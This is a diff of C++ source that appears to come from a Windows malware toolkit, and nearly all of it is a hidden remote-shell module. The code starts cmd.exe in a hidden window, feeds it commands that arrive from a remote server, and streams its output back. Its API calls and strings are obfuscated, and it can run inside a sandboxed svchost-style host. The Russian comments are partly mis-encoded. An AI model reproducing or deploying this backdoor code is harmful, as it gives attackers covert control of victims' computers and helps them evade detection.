@@ -1,47 +1,46 @@
-#include "core\core.h"
-#include "core\pipe.h"
-#include "core\debug.h"
-#include "core\process.h"
-#include "main.h"
-#include "manager.h"
-#include "other.h"
-#include "sandbox.h"
+#include <WinSock2.h>
+#include "../../core/include/core/type.h"
+#include "../../core/include/core/pipe.h"
+#include "../include/Manager.h"
+#include "../../core/include/core/debug.h"
+#include "../include/main.h"
+#include "../include/sandbox.h"
 
 class WinCmdServer : public PipeServer
 {
-		HANDLE stdoutReadHandle, stdoutWriteHandle;
-		HANDLE stdinReadHandle, stdinWriteHandle;
-		HANDLE hprocess;
-		DWORD pid;
-		uint idStream;
-		bool stop;
+	HANDLE stdoutReadHandle, stdoutWriteHandle;
+	HANDLE stdinReadHandle, stdinWriteHandle;
+	HANDLE hprocess;
+	DWORD pid;
+	uint idStream;
+	bool stop;
 
-		virtual int Handler( Pipe::Msg* msgIn, void** msgOut );
-		virtual void Disconnect();
+	virtual int Handler(Pipe::Msg* msgIn, void** msgOut);
+	virtual void Disconnect();
 
-	public:
+public:
 
-		WinCmdServer();
-		~WinCmdServer();
+	WinCmdServer();
+	~WinCmdServer();
 
-		bool Init();
-		void Release();
-		void SetIdStream( uint id )
-		{
-			idStream = id;
-		}
-		bool IsStop() const
-		{
-			return stop;
-		}
-		//считывает данные от запущенного cmd.exe и отсылает их на сервер
-		void LoopReaderFromCmd();
+	bool Init();
+	void Release();
+	void SetIdStream(uint id)
+	{
+		idStream = id;
+	}
+	bool IsStop() const
+	{
+		return stop;
+	}
+	//считывает данные от запущенного cmd.exe и отсылает их на сервер
+	void LoopReaderFromCmd();
 
 };
 
-static void HandlerCreatedPipeStream( Pipe::AutoMsg msg, DWORD tag );
+static void HandlerCreatedPipeStream(Pipe::AutoMsg msg, DWORD tag);
 //считывает данные с потока cmd.exe и отправл€ет на сервер
-static DWORD WINAPI LoopReaderFromCmdThread( void* );
+static DWORD WINAPI LoopReaderFromCmdThread(void*);
 
 WinCmdServer::WinCmdServer()
 {
@@ -61,64 +60,64 @@ void WinCmdServer::Release()
 	API(KERNEL32, CloseHandle)(stdoutWriteHandle);
 	API(KERNEL32, CloseHandle)(stdinReadHandle);
 	API(KERNEL32, CloseHandle)(stdinWriteHandle);
-	if( hprocess )
+	if (hprocess)
 	{
-		API(KERNEL32, TerminateProcess)( hprocess, 0 );
+		API(KERNEL32, TerminateProcess)(hprocess, 0);
 		API(KERNEL32, CloseHandle)(hprocess);
 	}
 }
 
 bool WinCmdServer::Init()
 {
-    SECURITY_ATTRIBUTES saAttr; 
-    Mem::Zero(saAttr); 
-    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES); 
-    saAttr.bInheritHandle = TRUE; 
-    saAttr.lpSecurityDescriptor = NULL; 
+	SECURITY_ATTRIBUTES saAttr;
+	Mem::Zero(saAttr);
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;
+	saAttr.lpSecurityDescriptor = NULL;
 
-	if( !API(KERNEL32, CreatePipe)( &stdoutReadHandle, &stdoutWriteHandle, &saAttr, 0 ) ) return false;
-	if( !API(KERNEL32, CreatePipe)( &stdinReadHandle, &stdinWriteHandle, &saAttr, 0 ) ) return false;
+	if (!API(KERNEL32, CreatePipe)(&stdoutReadHandle, &stdoutWriteHandle, &saAttr, 0)) return false;
+	if (!API(KERNEL32, CreatePipe)(&stdinReadHandle, &stdinWriteHandle, &saAttr, 0)) return false;
 
 
-    STARTUPINFOA si;
-    PROCESS_INFORMATION pi;
-	memset( &si, 0, sizeof(si) );
-	memset( &pi, 0, sizeof(pi) );
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	memset(&si, 0, sizeof(si));
+	memset(&pi, 0, sizeof(pi));
 	si.cb = sizeof(si);
 	si.dwFlags = STARTF_USESHOWWINDOW;
 	si.wShowWindow = SW_HIDE;
 	si.hStdError = stdoutWriteHandle;
-    si.hStdOutput = stdoutWriteHandle;
-    si.hStdInput = stdinReadHandle;
-    si.dwFlags |= STARTF_USESTDHANDLES;
+	si.hStdOutput = stdoutWriteHandle;
+	si.hStdInput = stdinReadHandle;
+	si.dwFlags |= STARTF_USESTDHANDLES;
 
-	if( !API(KERNEL32, CreateProcessA)( 0, _CS_("cmd.exe"), 0, 0, TRUE, 0, 0, 0, &si, &pi ) ) return false;
+	if (!API(KERNEL32, CreateProcessA)(0, _CS_("cmd.exe"), 0, 0, TRUE, 0, 0, 0, &si, &pi)) return false;
 
 	hprocess = pi.hProcess;
 	pid = pi.dwProcessId;
 
 	API(KERNEL32, CloseHandle)(pi.hThread);
 
-	ManagerServer::CreateVideoPipeStream( _CS_("cmd"), name, HandlerCreatedPipeStream, 0, (DWORD)this );
+	ManagerServer::CreateVideoPipeStream(_CS_("cmd"), name, HandlerCreatedPipeStream, 0, (DWORD)this);
 	return true;
 }
 
-int WinCmdServer::Handler( Pipe::Msg* msgIn, void** msgOut )
+int WinCmdServer::Handler(Pipe::Msg* msgIn, void** msgOut)
 {
 	int ret = 0;
-	switch( msgIn->cmd )
+	switch (msgIn->cmd)
 	{
-		case 1: //отсылка данных в cmd.exe
-			{
-				DbgMsg( "ƒл€ cmd.exe пришло сообщение длиною %d", msgIn->sz_data );
-				DWORD rd;
-				if( !API(KERNEL32, WriteFile)( stdinWriteHandle, msgIn->data, msgIn->sz_data, &rd, NULL ) )
-				{
-					ret = -1;
-					stop = true;
-				}
-			}
-			break;
+	case 1: //отсылка данных в cmd.exe
+	{
+		DbgMsg("ƒл€ cmd.exe пришло сообщение длиною %d", msgIn->sz_data);
+		DWORD rd;
+		if (!API(KERNEL32, WriteFile)(stdinWriteHandle, msgIn->data, msgIn->sz_data, &rd, NULL))
+		{
+			ret = -1;
+			stop = true;
+		}
+	}
+	break;
 	}
 	return ret;
 }
@@ -127,26 +126,26 @@ void WinCmdServer::LoopReaderFromCmd()
 {
 	const int size_buf = 4096;
 	byte* buf = (byte*)Mem::Alloc(size_buf);
-	if( buf )
+	if (buf)
 	{
-		while( !stop && Process::IsAlive(hprocess) )
+		while (!stop && Process::IsAlive(hprocess))
 		{
 			DWORD rd, avail;
-			if( !API(KERNEL32, PeekNamedPipe)( stdoutReadHandle, buf, size_buf, &rd, &avail, 0 ) ) break;
-			if( rd > 0 )
+			if (!API(KERNEL32, PeekNamedPipe)(stdoutReadHandle, buf, size_buf, &rd, &avail, 0)) break;
+			if (rd > 0)
 			{
-				while( avail > 0 )
+				while (avail > 0)
 				{
 					int sz = avail;
-					if( sz > size_buf ) sz = size_buf;
-					API(KERNEL32, ReadFile)( stdoutReadHandle, buf, sz, &rd, NULL );
-					ManagerServer::SendVideoStream( idStream, buf, rd );
+					if (sz > size_buf) sz = size_buf;
+					API(KERNEL32, ReadFile)(stdoutReadHandle, buf, sz, &rd, NULL);
+					ManagerServer::SendVideoStream(idStream, buf, rd);
 					avail -= sz;
 				}
 			}
 			Delay(200);
 		}
-		DbgMsg( "ѕроцесс cmd.exe завершен" );
+		DbgMsg("ѕроцесс cmd.exe завершен");
 		Mem::Free(buf);
 		Stop();
 	}
@@ -155,42 +154,42 @@ void WinCmdServer::LoopReaderFromCmd()
 
 void WinCmdServer::Disconnect()
 {
-	DbgMsg( "WinCmdServer остановлен" );
+	DbgMsg("WinCmdServer остановлен");
 	stop = true;
 	ManagerServer::CloseStream(idStream);
 }
 
-void HandlerCreatedPipeStream( Pipe::AutoMsg msg, DWORD tag )
+void HandlerCreatedPipeStream(Pipe::AutoMsg msg, DWORD tag)
 {
 	WinCmdServer* wincmd = (WinCmdServer*)tag;
 	int idStream = *((uint*)msg->data);
 	wincmd->SetIdStream(idStream);
-	DbgMsg( "ѕолучен id дл€ потока cmd.exe %d", idStream );
-	RunThread( LoopReaderFromCmdThread, wincmd ); //отсылка данных с pipe на сервер
+	DbgMsg("ѕолучен id дл€ потока cmd.exe %d", idStream);
+	RunThread(LoopReaderFromCmdThread, wincmd); //отсылка данных с pipe на сервер
 }
 
-DWORD WINAPI LoopReaderFromCmdThread( void* v )
+DWORD WINAPI LoopReaderFromCmdThread(void* v)
 {
 	WinCmdServer* wincmd = (WinCmdServer*)v;
 	wincmd->LoopReaderFromCmd();
 	return 0;
 }
 
-static DWORD WINAPI WinCmdProcess( void* )
+static DWORD WINAPI WinCmdProcess(void*)
 {
-	if( (Config::state & NOT_USED_SCVHOST) == 0 )
+	if ((Config::state & NOT_USED_SCVHOST) == 0)
 	{
 		Sandbox::Init();
-		if( !Pipe::InitServerPipeResponse() ) return 0;
+		if (!Pipe::InitServerPipeResponse()) return 0;
 	}
 	WinCmdServer* wincmd = new WinCmdServer();
-	if( wincmd->Init() )
+	if (wincmd->Init())
 	{
 		wincmd->Start(true); //запуск приема pipe сообщений от сервера
 	}
 	Delay(5000);
 	delete wincmd;
-	if( (Config::state & NOT_USED_SCVHOST) == 0 )
+	if ((Config::state & NOT_USED_SCVHOST) == 0)
 		API(KERNEL32, ExitProcess)(0);
 	return 0;
 }
@@ -198,16 +197,16 @@ static DWORD WINAPI WinCmdProcess( void* )
 namespace WinCmd
 {
 
-void Start( const char* nameUser )
-{
-	if( Config::state & NOT_USED_SCVHOST )
+	void Start(const char* nameUser)
 	{
-		RunThread( WinCmdProcess, 0 );
+		if (Config::state & NOT_USED_SCVHOST)
+		{
+			RunThread(WinCmdProcess, 0);
+		}
+		else
+		{
+			Sandbox::Run(WinCmdProcess, nameUser, 0, 0, false);
+		}
 	}
-	else
-	{
-		Sandbox::Run( WinCmdProcess, nameUser, 0, 0, false );
-	}
-}
 
 }
